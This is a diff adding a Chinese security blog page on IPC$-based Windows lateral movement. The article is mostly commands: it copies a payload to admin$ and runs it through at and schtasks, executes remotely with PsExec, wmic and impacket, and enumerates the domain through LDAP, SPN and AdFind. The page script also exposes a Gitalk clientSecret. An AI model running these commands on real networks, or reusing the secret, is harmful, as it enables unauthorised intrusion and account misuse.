@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="网络安全,攻防研究" />
+  <meta name="author" content="B Stark" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      IPC攻击 
+      
+      
+      |
+    
+     B.Stark&#39;Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="B.Stark'Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">BStark</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">IPC攻击</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-01-01 15:01:34
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                    <b>#</b> 内网渗透
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>概述:</p>
+<p>IPC共享“命令管道”的资源，是为了实现进程间通信而开放的命名管道<br>IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用<br>通过ipc$，与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可<br>以在目标机器中执行命令，获取目标机中的信息<br>常用于横向渗透,权限维持.</p>
+<p>建立ipc$的命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP地址\ipc<span class="variable">$</span> “密码” /user:“用户名” //建立连接</span><br><span class="line">net use //查看当前连接</span><br></pre></td></tr></table></figure>
+
+<p>ipc$利用条件</p>
+<p>管理员开启了默认共享</p>
+<p>139、445端口开启</p>
+<p><strong>IPC攻击利用</strong></p>
+<p>1.用 Windows 自带的工具获取远程主机信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 目标IP地址 /U 用户名 /P 密码  <span class="comment">#查看目标主机运行的进程</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \\目标iP地址\主机盘符               <span class="comment">#查看目标主机的目录树</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.利用计划任务进行攻击</p>
+<ul>
+<li>AT 命令 (适用windows2003 xp 之前)</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at \\<span class="number">10.10</span>.<span class="number">10.20</span></span><br><span class="line">at \\<span class="number">10.10</span>.<span class="number">10.20</span> <span class="number">3</span> /delete    <span class="comment">#删除指定计划任务</span></span><br><span class="line">net time \\<span class="number">10.10</span>.<span class="number">10.20</span>    <span class="comment">#查看目标机器时间</span></span><br><span class="line">at \\<span class="number">10.10</span>.<span class="number">10.20</span> <span class="number">18</span>:<span class="number">00</span> \\<span class="number">10.10</span>.<span class="number">10.20</span>\admin<span class="variable">$</span>\hack.bat   <span class="comment">#执行计划任务</span></span><br><span class="line"></span><br><span class="line">xcopy c:\payload.exe \\<span class="number">192.168</span>.<span class="number">1.101</span>\admin<span class="variable">$</span>\temp  <span class="comment">#拷贝payload到远程主机对应目录下</span></span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">1.101</span> <span class="number">19</span>:<span class="number">30</span> /every:<span class="number">1</span>,<span class="number">5</span> c:\windows\temp\payload.exe <span class="comment">#设定计划任务，每月5,1日的19:30执行命令运行payload</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>schtasks命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 远程IP地址 /ru 指定账户的权限运行任务 /tn 计划名 /tr 指定运行的程序或命令</span><br><span class="line">/st 指定时间 /sc 计划类型</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192.168</span>.<span class="number">1.102</span> /u “administrator” /p “<span class="number">123</span>!<span class="selector-tag">@</span><span class="comment">#” /RL HIGHEST /tn windowsupdate /tr C:\\Windows\temp\1.bat /sc DAILY /mo 1 /ST 19:30  #创建任务</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 远程IP地址 /i /tn 计划任务名</span><br><span class="line">schtasks /run /tn windowsupdate /s <span class="number">192.168</span>.<span class="number">1.102</span> /u “administrator” /p “<span class="number">123</span>!<span class="selector-tag">@</span><span class="comment">#”  #运行任务</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 远程IP地址 /tn 计划名 /f   <span class="comment">#删除计划任务</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p><strong>Windows原生工具</strong></p>
+<ul>
+<li>PsExec(pstools)</li>
+</ul>
+<p>原理是基于IPC共享，目标需要开放445端口和admin$共享</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe –accepteula \\远程IP地址 -s cmd.exe</span><br><span class="line">PsExec.exe \\远程IP地址 -u 账户 –p 密码 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>• -accepteula：使用该参数第一次运行时不会弹出确认框<br>• -s：以System权限运行远程进程<br>• -u：域\用户名<br>• -p：密码</p>
+<ul>
+<li>Wmic</li>
+</ul>
+<p>Wmic,默认所有版本Windows安装, 系统默认不会在日志中记录,推荐使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:目标IP地址 /user:用户名 /password:密码 process call create &quot;cmd.exe /c cmd命令&gt;d:\result.txt&quot;</span><br><span class="line">type \\192.168.182.182\D$\result.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>impacket工具包</strong></p>
+<p>impacket远程命令执行工具包含:</p>
+<p>• psexec.py • smbexec.py • atexec.py • wmiexec.py</p>
+<ul>
+<li>psexec.py</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py [domain/] username [: password] @ [Target IP Address]</span><br><span class="line">• 在工作组环境下：psexec.py 用户名:密码@目标IP 要执行命令</span><br><span class="line">• 在域环境下： psexec.py 域名/用户名:密码@目标IP 要执行的命令</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>wmiexec</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py [domain/] username [: password] @ [Target IP Address]</span><br><span class="line">• 在工作组环境下：wmiexec.py 用户名:密码@目标IP 要执行命令</span><br><span class="line">• 在域环境下： wmiexec.py 域名/用户名:密码@目标IP 要执行的命令</span><br></pre></td></tr></table></figure>
+
+<h1 id="Active-Directory-amp-LDAP"><a href="#Active-Directory-amp-LDAP" class="headerlink" title="Active Directory&amp;LDAP"></a>Active Directory&amp;LDAP</h1><p>AD（Active Directory）活动目录,是一种基于数据库的系统，可在windows环境中提供身份验证、目录、策略和其他服务.</p>
+<p>LDAP（轻量级目录访问协议）则提供查询和修改目录服务及程序中的项目应用协议</p>
+<p><strong>ldapsearch工具</strong></p>
+<p>利用ldapsearch信息搜集</p>
+<p>能访问DC的389端口，且已经知道一个域内账户的账号密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ldap-ut    <span class="comment">#安装</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -D <span class="string">&quot;ls@ichunqiu.com&quot;</span> -w <span class="string">&quot;123.com&quot;</span> -p 389 -h 10.10.10.20 -b </span><br><span class="line"><span class="string">&quot;DC=ichunqiu,DC=com&quot;</span> <span class="string">&quot;(&amp;(objectClass=user)(objectCategory=person))&quot;</span> | grep ^cn        <span class="comment">#查看用户名</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -D <span class="string">&quot;ls@ichunqiu.com&quot;</span> -w <span class="string">&quot;123.com&quot;</span> -p 389 -h 10.10.10.20 -b</span><br><span class="line"><span class="string">&quot;DC=ichunqiu,DC=com&quot;</span> <span class="string">&quot;(&amp;(objectClass=computer)(objectCategory=computer))&quot;</span> | grep ^cn  <span class="comment">#查询计算机名</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -D <span class="string">&quot;ls@ichunqiu.com&quot;</span> -w <span class="string">&quot;123.com&quot;</span> -p 389 -h 10.10.10.20 -b</span><br><span class="line"><span class="string">&quot;DC=ichunqiu,DC=com&quot;</span> <span class="string">&quot;(&amp;(objectClass=computer)(objectCategory=computer))&quot;</span> | grep ^cn  <span class="comment">#查询域内组</span></span><br><span class="line"></span><br><span class="line">参数说明：-x 进行简单认证；-H 服务器地址；-D 用来绑定服务器的DN；-w 绑定DN的密码；-b 指定要查询的根节点</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h2><p>• 服务主体名称（SPN:Service Principal Names）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的<br>唯一标识符，服务在加入域中时是自动注册的。简单来说： SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN，如果想使用Kerberos协议来认证服务，那么必须正确配置 SPN,在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”</p>
+<ol>
+<li>SPN扫描可以发现重要的服务器机器，如：终端、交换机、邮服、数据库之类;不需要进行主动扫描相比之下隐蔽性更高</li>
+<li>所有的域用户都可以通过LDAP获取到域内所有SPN，进而通过Kerberoasting攻击完成域内提权等</li>
+<li>在获得SPN修改权限后可以为指定域用户添加SPN，通过随时获取该用户的TGS破解明文密码，作为域内持久化手段</li>
+</ol>
+<ul>
+<li><strong>SPN格式</strong></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;service <span class="class"><span class="keyword">class</span>&gt;/&lt;<span class="title">host</span>&gt;:&lt;<span class="title">port</span>&gt; &lt;<span class="title">servicename</span>&gt;</span></span><br><span class="line"><span class="class">#服务类型 / 对应机器名:服务端口号 服务名</span></span><br><span class="line"><span class="class">#其中服务类和主机是必需参数，端口和服务名为可选</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>setspn命令(系统自带)</strong></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn –q */*           <span class="comment">#来查询当前域下的所有SPN</span></span><br><span class="line">setspn –T 域名 –q */*   <span class="comment">#查看指定域的所有SPN</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>adfind.exe工具</strong></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-sc</span> dclist 										   <span class="comment">#列出域控的名称</span></span><br><span class="line">AdFind.exe <span class="literal">-schema</span> <span class="literal">-s</span> base objectv                             <span class="comment">#查看域控的版本</span></span><br><span class="line">AdFind.exe <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSyste    <span class="comment">#查询当前域中所有计算机</span></span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/61982/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-01-01 15:01:34
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                        <b>#</b> 内网渗透
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/2353/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">远程命令执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Active-Directory-amp-LDAP"><span class="toc-text">Active Directory&amp;LDAP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SPN%E6%89%AB%E6%8F%8F"><span class="toc-text">SPN扫描</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/src/md5.min.js"></script>
+  <div id="gitalk-container"></div>
+
+  <script>
+    const gitalk = new Gitalk({
+      clientID: 'a8912b1aa74ebdeb8ecf',
+      clientSecret: '2e09f32571113ed72c6902713871ee0702291593',
+      repo: 'bstark',
+      owner: 'bbbstark',
+      admin: ['bbbstark'],
+      id: location.pathname,
+      distractionFreeMode: false
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/bbbstark">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a href="https://bstark.me">Copyright © Bstark 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + IPC%E6%94%BB%E5%87%BB + '&url=' + https%3A%2F%2Fbstark.me%2Fposts%2F8221%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://bstark.me/posts/8221/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
